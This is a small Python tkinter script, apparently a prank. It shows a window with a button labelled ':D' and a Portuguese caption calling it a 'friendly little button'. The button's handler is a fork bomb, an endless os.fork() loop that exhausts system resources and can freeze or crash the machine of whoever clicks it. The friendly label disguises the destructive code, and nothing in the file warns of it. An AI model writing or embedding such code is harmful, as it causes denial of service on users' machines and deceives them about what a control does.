import tkinter as tk
import os

root = tk.Tk()

def AAAA():
    while True:
        os.fork()


root.title("yay")
root.geometry("500x300+200+200")
root.wm_resizable(width = False, height = False)

button1 = tk.Button(root, text = ":D", command=AAAA)
button1.pack(pady=10)

label1 = tk.Label(root, text = "fbhhfhbrgtrgturtbborgtbbbbbbbbbbbbbbbbbbgggbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA")
label1.place(width=800, height=20, x=00, y=100)
label2 = tk.Label(root, text = "botãozinho amigável^")
label2.place(width=800, height=20, x=00, y=50)

root.mainloop()
